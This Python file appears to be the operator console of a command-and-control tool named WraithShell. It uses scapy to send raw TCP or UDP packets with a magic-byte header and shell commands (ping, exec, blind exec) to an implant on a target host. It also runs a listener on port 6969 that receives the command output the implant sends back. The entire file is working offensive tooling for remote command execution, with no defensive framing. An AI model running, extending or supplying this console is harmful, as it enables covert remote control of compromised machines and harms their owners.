from scapy.all import *
import sys
import socket
import struct
import random
import threading
import cmd

MAGIC_BYTES = 0x0b1e55ed
C2_PORT = 6969
CMD_MAP = {"CMD_PING" : 0x01, "CMD_EXEC_BLIND" : 0x02, "CMD_EXEC" : 0x03}

PURPLE = "\033[95m"
RESET  = "\033[0m"

def send_packet_TCP(cmd, cmd_type, agent_ip, port):

    print("Sending via TCP")
    # Assemble header, which is [MAGIC][CMD TYPE][CMD LENGTH] all in big endian
    packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))

    # Add on payload (the cmd)
    packet += cmd.encode()

    # Craft a raw TCP packet
    pkt = IP(dst=agent_ip) / TCP(dport=port, sport=54321, flags="PA") / Raw(load=packet)

    send(pkt, verbose=False)

def send_packet_UDP(cmd, cmd_type, agent_ip, port):

    print("Sending via UDP")
    # Assemble header, which is [MAGIC][CMD TYPE][CMD LENGTH] all in big endian
    packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))

    # Add on payload (the cmd)
    packet += cmd.encode()

    # Craft a raw UDP packet
    pkt = IP(dst=agent_ip) / UDP(dport=port, sport=54321) / Raw(load=packet)

    send(pkt, verbose=False)



class WraithShell(cmd.Cmd):

    # Set up target IP and port, sender wrapper, and listener
    def __init__(self):
        super().__init__()
        self.target_IP = None
        self.target_port = None
        self.current_protocol = "TCP"
        self.sender_wrapper = send_packet_TCP
        self.stop_listener = None
        self._update_prompt()

    # Helper function to update the prompt when a target is set
    def _update_prompt(self):
        if self.target_IP and self.target_port:
            self.prompt = f"{PURPLE}wraith [{self.target_IP}:{self.target_port}][{self.current_protocol}]>{RESET} "
        else:
            self.prompt = f"{PURPLE}wraith [{self.current_protocol}]>{RESET} "

    # Helper function to check if target is set
    def _check_target(self):
        if not self.target_IP and not self.target_port:
            print("Target IP and port have not been set")
            return False
        return True

    # Helper function for listener
    def _start_listener(self):

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", C2_PORT))
        server.listen(1)

        stop_event = threading.Event()

        def _accept_loop():
            
            server.settimeout(1.0) 
            while not stop_event.is_set():
                
                try:
                    conn, addr = server.accept()
                except socket.timeout:
                    continue  # loop back and check stop_event
                except OSError:
                    break     # socket was closed externally

                output = b""
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    output += chunk
                conn.close()

                message = output.decode(errors="replace").strip().lower()
                if message == "pong":
                    print(f"[+] Pong received from {addr[0]}")
                else:
                    # Clear current input line
                    sys.stdout.write('\r\033[K') 

                    print(f"\n[+] Incoming response from {addr[0]}")
                    print(message)

                    #sys.stdout.write(self.prompt)

                    # Flush stdout
                    sys.stdout.flush()

        # Thread the accept loop
        t = threading.Thread(target=_accept_loop, daemon=True)
        t.start()

        def stop():
            stop_event.set()
            t.join(timeout=2)

        return stop

    # Handle target
    def do_target(self, arg):
        """target set [IP] [PORT (optional)]\ntarget status
        """
        args = arg.split()

        # Set target IP and port
        if len(args) >= 2 and args[0] == "set":

            self.target_IP = args[1]

            if len(args) == 3:

                self.target_port = int(args[2]) 
            else:

                self.target_port = random.randint(1, 65535)

            print(f"Setting target to {self.target_IP}:{self.target_port}")
            self._update_prompt()

        elif len(args) == 1 and args[0] == "status":

            if self.target_IP and self.target_port:
                print(f"Current target is {self.target_IP}:{self.target_port}")

            else:
                print("Target IP and port has not been set")

        else:
            print(self.do_target.__doc__)

    # Handle ping
    def do_ping(self, arg):
        """ping (that's all it is lol)"""

        if not self._check_target():
            return
        
        self.sender_wrapper("ping", "CMD_PING", self.target_IP, self.target_port)
        print(f"Sent ping to {self.target_IP} over port {self.target_port}")

    # Handle exec
    def do_exec(self, arg):
        """exec [cmd]\nexec blind [cmd]"""

        args = arg.split()

        if len(args) < 1:
            print(self.do_exec.__doc__)


        elif args[0] == "blind":

            cmd = arg.split("blind", 1)[1].strip()

            print(f"Executing command '{cmd}' BLIND")

            self.sender_wrapper(cmd, "CMD_EXEC_BLIND", self.target_IP, self.target_port)

        else:

            if not self._check_target():
                return

            cmd_args = arg.split("exec", 1)

            cmd = cmd_args[0].strip()

            print(f"Executing command '{cmd}'")

            self.sender_wrapper(cmd, "CMD_EXEC", self.target_IP, self.target_port)

        #else:
        #    print(self.do_exec.__doc__)

    # Handle listener
    def do_listener(self, arg):
        """listener [start | stop | status]"""
        match arg.strip().lower():

            # Start listener
            case "start":

                if self.stop_listener:
                    print("Listener already running")

                else:
                    print(f"Starting listener on port {C2_PORT}")
                    self.stop_listener = self._start_listener()

            # Stop listener
            case "stop":

                if not self.stop_listener:
                    print("Listener is not running")

                else:
                    print("Stopping listener")
                    self.stop_listener()
                    self.stop_listener = None

            case "status":
                if self.stop_listener:
                    print(f"Listener is running on port {C2_PORT}")

                else:
                    print("Listener is not up")

            case _:
                print(self.do_listener.__doc__)

    # Handle protocol switching
    def do_protocol(self, arg):
        """protocol [tcp | udp]"""

        match arg.strip().lower():

            case "tcp":
                if self.sender_wrapper == send_packet_TCP:
                    print("Send protocol is already TCP")

                else:
                    self.sender_wrapper = send_packet_TCP
                    self.current_protocol = "TCP"
                    self._update_prompt()
                    print("Switched send protocol to TCP")

            case "udp":
                if self.sender_wrapper == send_packet_UDP:
                    print("Send protocol is already UDP")

                else:
                    self.sender_wrapper = send_packet_UDP
                    self.current_protocol = "UDP"
                    self._update_prompt()
                    print("Switched send protocol to UDP")

            case _:
                print(self.do_protocol.__doc__)

    # Handle exit and quit
    def do_exit(self, arg):
        """Exit WraithShell"""
        if self.stop_listener:
            self.stop_listener()

        print("Exiting WraithShell")
        return True

    def do_quit(self, arg):
        """Exit WraithShell"""
        return self.do_exit(arg)

    # Handle EOF
    def do_EOF(self, arg):
        print()
        return self.do_exit(arg)

if __name__ == "__main__":
    
    shell = WraithShell()
    try:
        shell.cmdloop()
    except KeyboardInterrupt:
        shell.do_exit("")
